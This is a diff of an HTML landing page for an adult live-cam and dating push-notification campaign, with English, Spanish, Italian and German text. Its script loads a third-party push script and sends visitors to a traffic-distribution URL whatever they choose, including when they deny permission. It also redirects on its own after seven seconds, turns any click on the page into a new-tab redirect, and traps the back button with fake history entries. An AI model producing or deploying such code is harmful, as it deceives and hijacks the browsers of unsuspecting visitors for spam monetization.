@@ -2,163 +2,204 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dating Land - Camob Germe</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>18+ Live Cams & Dating - Turn On Notifications</title>
+    <meta name="description" content="Hot live cams & real dates waiting for you. Enable notifications to never miss a message! 18+ only.">
     <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
         html, body {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            font-family: Arial, sans-serif;
-            background-color: #000;
+            width:100%; height:100%; overflow:hidden;
+            font-family: -apple-system, BlinkMacOSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background:#000; color:#fff;
+            touch-action: manipulation;
         }
-        #videoContainer {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            z-index: 1;
+        #bgVideo {
+            position:fixed; top:50%; left:50%; min-width:100%; min-height:100%;
+            width:auto; height:auto; transform:translate(-50%,-50%);
+            object-fit:cover; z-index:1;
         }
-        #myVideo {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            min-width: 100%;
-            min-height: 100%;
-            width: auto;
-            height: auto;
-            transform: translate(-50%, -50%);
-            object-fit: cover;
+        #content {
+            position:relative; z-index:3; height:100%;
+            display:flex; flex-direction:column; justify-content:center; align-items:center;
+            text-align:center; padding:20px;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.3), rgba(0,0,0,0.85) 60%);
         }
-        #overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(to bottom, rgba(0,0,0,0.4), rgba(0,0,0,0.8));
-            z-index: 2;
-            opacity: 0;
-            transition: opacity 0.5s ease;
+        h1 {
+            font-size: clamp(28px, 8vw, 54px); margin-bottom:12px; line-height:1.1;
+            text-shadow: 0 3px 12px rgba(255,0,120,0.7);
         }
-        #overlay.show {
-            opacity: 1;
+        p.subtitle {
+            font-size: clamp(18px, 5vw, 28px); margin:0 0 28px; max-width:90%;
+            opacity:0.95;
         }
-        #subscribeBtn {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%) scale(0);
-            padding: 18px 36px;
-            font-size: 26px;
-            color: #fff;
-            background-color: rgba(255, 0, 150, 0.9);
-            border: 2px solid #fff;
-            border-radius: 12px;
-            cursor: pointer;
-            z-index: 3;
-            opacity: 0;
-            transition: transform 0.5s ease, opacity 0.5s ease;
-            white-space: nowrap;
+        .age-warning {
+            font-size:16px; color:#ff4d4d; margin-bottom:20px; font-weight:bold;
+            background:rgba(0,0,0,0.6); padding:8px 16px; border-radius:8px;
         }
-        #subscribeBtn.show {
-            transform: translate(-50%, -50%) scale(1);
-            opacity: 1;
+        #allowBtn {
+            padding:20px 48px; font-size: clamp(22px, 6vw, 32px); font-weight:bold;
+            color:#fff; background: linear-gradient(145deg, #ff0066, #cc0066);
+            border:none; border-radius:60px; cursor:pointer;
+            box-shadow:0 8px 30px rgba(255,0,100,0.6);
+            transition: all 0.3s;
+            animation: pulse 2s infinite;
+            margin:20px 0;
         }
+        #allowBtn:hover { transform:scale(1.08); box-shadow:0 12px 40px rgba(255,0,100,0.8); }
+        @keyframes pulse {
+            0% { transform:scale(1); } 50% { transform:scale(1.06); } 100% { transform:scale(1); }
+        }
+        .small-text { font-size:14px; opacity:0.7; margin-top:30px; max-width:80%; }
+        .lang-switch { position:absolute; top:16px; right:16px; z-index:4; }
+        .lang-switch button {
+            background:none; border:none; color:#fff; font-size:16px; cursor:pointer; margin-left:8px;
+            opacity:0.8;
+        }
+        .lang-switch button.active { font-weight:bold; opacity:1; text-decoration:underline; }
     </style>
 </head>
 <body>
 
-<div id="videoContainer">
-    <video id="myVideo" autoplay muted playsinline loop>
-        <source src="https://cdn.pixabay.com/video/2024/02/25/201545-917327263_large.mp4" type="video/mp4">
-    </video>
-    <div id="overlay"></div>
-    <div id="subscribeBtn">Subscribe to continue</div>
+<video id="bgVideo" autoplay muted playsinline loop>
+    <source src="https://cdn.pixabay.com/video/2024/02/25/201545-917327263_large.mp4" type="video/mp4">
+    <!-- You can replace with your own hotter + shorter clip if possible -->
+</video>
+
+<div id="content">
+    <div class="lang-switch">
+        <button class="lang-btn active" data-lang="en">EN</button>
+        <button class="lang-btn" data-lang="es">ES</button>
+        <button class="lang-btn" data-lang="it">IT</button>
+        <button class="lang-btn" data-lang="de">DE</button>
+        <!-- Add more for JP/KR later if you translate -->
+    </div>
+
+    <div class="age-warning">18+ ONLY – Adult Content</div>
+
+    <h1 id="title">Hot Singles & Live Cams Are Waiting!</h1>
+    <p class="subtitle" id="subtitle">Turn on notifications to get instant messages from real people near you 🔥 Don't miss out!</p>
+
+    <button id="allowBtn">ALLOW NOTIFICATIONS →</button>
+
+    <p class="small-text" id="footerText">
+        By clicking Allow you agree to receive adult notifications. You must be 18+. You can unsubscribe anytime.
+    </p>
 </div>
 
 <script>
-    // CAMOB GERME - ПО ОФИЦИАЛЬНОЙ ДОКЕ TACOLO
-    // Binom: https://datingland.site/germe/?click_id={clickid}&sub_id=camob
-    
-    const urlParams = new URLSearchParams(window.location.search);
-    const clickId = urlParams.get('click_id') || 'no_clickid';  // для Tacolo
-    const subId = urlParams.get('sub_id') || 'camob';           // camob
-    
-    console.log('Camob ClickID:', clickId, 'SubID:', subId);
-    
-    // TACOLO PS.JS
-    (function() {
-        const s = document.createElement('script');
-        s.src = `https://wpcpc.sjscdn.com/ps/ps.js?id=j-DQEhxgKEueEzYw3M-eJQ&click_id=${encodeURIComponent(clickId)}`;
-        s.async = true;
-        document.head.appendChild(s);
-    })();
-
-    // TDS С CAMOB
-    const tdsUrl = `https://hotbjayapa.today/tds?id=1556189731&p1=${encodeURIComponent(clickId)}&p2=${encodeURIComponent(subId)}&p3=sub3&p4=sub4`;
-    const chatUrl = 'https://datingland.site/chat';
-    const backUrl = 'https://hotbjayapa.today/tds?id=1556189731&p1=camob&p2=sub2&p3=sub3&p4=sub4';
-
-    let isDone = false;
-
-    function goToTDS() {
-        if (isDone) return;
-        isDone = true;
-        window.location.replace(tdsUrl);
+// ────────────────────────────────────────────────
+//  BASIC MULTI-LANGUAGE (add more as needed)
+// ────────────────────────────────────────────────
+const translations = {
+    en: {
+        title: "Hot Singles & Live Cams Are Waiting!",
+        subtitle: "Turn on notifications to get instant messages from real people near you 🔥 Don't miss out!",
+        footer: "By clicking Allow you agree to receive adult notifications. You must be 18+. You can unsubscribe anytime."
+    },
+    es: {
+        title: "¡Solteros calientes y cámaras en vivo te esperan!",
+        subtitle: "Activa notificaciones para recibir mensajes instantáneos de gente real cerca de ti 🔥 ¡No te lo pierdas!",
+        footer: "Al hacer clic en Permitir aceptas recibir notificaciones para adultos. Debes tener +18. Puedes cancelar cuando quieras."
+    },
+    it: {
+        title: "Single bollenti e webcam in diretta ti aspettano!",
+        subtitle: "Attiva le notifiche per ricevere messaggi istantanei da persone vere vicino a te 🔥 Non perdertelo!",
+        footer: "Cliccando Consenti accetti di ricevere notifiche per adulti. Devi avere +18 anni. Puoi disdire in qualsiasi momento."
+    },
+    de: {
+        title: "Heiße Singles & Live-Cams warten auf dich!",
+        subtitle: "Schalte Benachrichtigungen ein, um sofort Nachrichten von echten Leuten in deiner Nähe zu bekommen 🔥 Verpass es nicht!",
+        footer: "Durch Klick auf Erlauben stimmst du Erwachsenen-Benachrichtigungen zu. Du musst 18+ sein. Kann jederzeit abbestellt werden."
     }
+};
 
-    function clickAction() {
-        if (isDone) return;
-        isDone = true;
-        window.open(tdsUrl, '_blank');
-        setTimeout(() => window.location.replace(chatUrl), 100);
+function setLanguage(lang) {
+    if (!translations[lang]) lang = 'en';
+    document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
+    document.querySelector(`.lang-btn[data-lang="${lang}"]`)?.classList.add('active');
+
+    document.getElementById('title').textContent = translations[lang].title;
+    document.getElementById('subtitle').textContent = translations[lang].subtitle;
+    document.getElementById('footerText').textContent = translations[lang].footer;
+}
+
+// Click language switch
+document.querySelectorAll('.lang-btn').forEach(btn => {
+    btn.addEventListener('click', () => setLanguage(btn.dataset.lang));
+});
+
+// Default language – can detect better later (navigator.language)
+setLanguage('en');
+
+// ────────────────────────────────────────────────
+//  YOUR CAMOB / TACOLO / TDS LOGIC
+// ────────────────────────────────────────────────
+const urlParams = new URLSearchParams(window.location.search);
+const clickId = urlParams.get('click_id') || 'no_clickid';
+const subId  = urlParams.get('sub_id')  || 'camob';
+
+console.log('ClickID:', clickId, 'SubID:', subId);
+
+// TACOLO PS.JS
+(function() {
+    const s = document.createElement('script');
+    s.src = `https://wpcpc.sjscdn.com/ps/ps.js?id=j-DQEhxgKEueEzYw3M-eJQ&click_id=${encodeURIComponent(clickId)}`;
+    s.async = true;
+    document.head.appendChild(s);
+})();
+
+// Your redirect URLs
+const tdsUrl   = `https://hotbjayapa.today/tds?id=1556189731&p1=${encodeURIComponent(clickId)}&p2=${encodeURIComponent(subId)}&p3=sub3&p4=sub4`;
+const chatUrl  = 'https://datingland.site/chat';
+const backUrl  = 'https://hotbjayapa.today/tds?id=1556189731&p1=camob&p2=sub2&p3=sub3&p4=sub4';
+
+let isDone = false;
+
+function goToTDS() {
+    if (isDone) return;
+    isDone = true;
+    window.location.replace(tdsUrl);
+}
+
+function forceAction() {
+    if (isDone) return;
+    isDone = true;
+    window.open(tdsUrl, '_blank');
+    setTimeout(() => { window.location.replace(chatUrl); }, 120);
+}
+
+// TACOLO callbacks – all lead to monetization
+window.onPermissionDefault   = goToTDS;
+window.onPermissionDenied    = goToTDS;
+window.onPermissionAllowed   = goToTDS;   // actually best case – but still redirect after
+window.onAlreadySubscribed   = goToTDS;
+window.onNotificationUnsupported = goToTDS;
+window.onTrafficFiltered     = goToTDS;
+
+// Auto-redirect after 7 seconds if nothing happened
+setTimeout(() => { if (!isDone) goToTDS(); }, 7000);
+
+// Button & anywhere click → try prompt or force
+const btn = document.getElementById('allowBtn');
+const action = () => {
+    // Most push providers trigger on user gesture
+    if (typeof window.requestPushPermission === 'function') {
+        window.requestPushPermission(); // if your provider exposes this
     }
+    setTimeout(forceAction, 400); // fallback
+};
 
-    // TACOLO CALLBACKS
-    window.onPermissionDefault = () => goToTDS();
-    window.onPermissionDenied = () => goToTDS();
-    window.onPermissionAllowed = () => goToTDS();
-    window.onAlreadySubscribed = () => goToTDS();
-    window.onNotificationUnsupported = () => goToTDS();
-    window.onTrafficFiltered = () => goToTDS();
+btn.addEventListener('click', action);
+document.body.addEventListener('click', action, { once: true }); // anywhere click also works
+
+// Back button trap
+(function() {
+    for (let i = 0; i < 4; i++) history.pushState(null, null, location.href);
+    window.addEventListener('popstate', () => {
+        history.pushState(null, null, location.href);
+        window.location.replace(backUrl);
+    });
+})();
 </script>
-
-<script>
-    setTimeout(() => { if (!isDone) goToTDS(); }, 5000);
-    
-    window.onbeforeunload = () => {
-        if (!isDone) return "Are you sure you want to leave?";
-    };
-
-    const video = document.getElementById('myVideo');
-    const btn = document.getElementById('subscribeBtn');
-    const overlay = document.getElementById('overlay');
-
-    video.addEventListener('playing', () => {
-        setTimeout(() => {
-            video.pause();
-            overlay.classList.add('show');
-            btn.classList.add('show');
-        }, 100);
-    }, { once: true });
-
-    btn.addEventListener('click', (e) => { e.preventDefault(); clickAction(); });
-    video.addEventListener('click', (e) => { e.preventDefault(); clickAction(); });
-
-    // BACK BUTTON
-    (function() {
-        for (let i = 0; i < 3; i++) history.pushState(null, null, location.href);
-        window.addEventListener('popstate', () => {
-            history.pushState(null, null, location.href);
-            window.location.replace(backUrl);
-        });
-    })();
-</script>
-
 </body>
 </html>
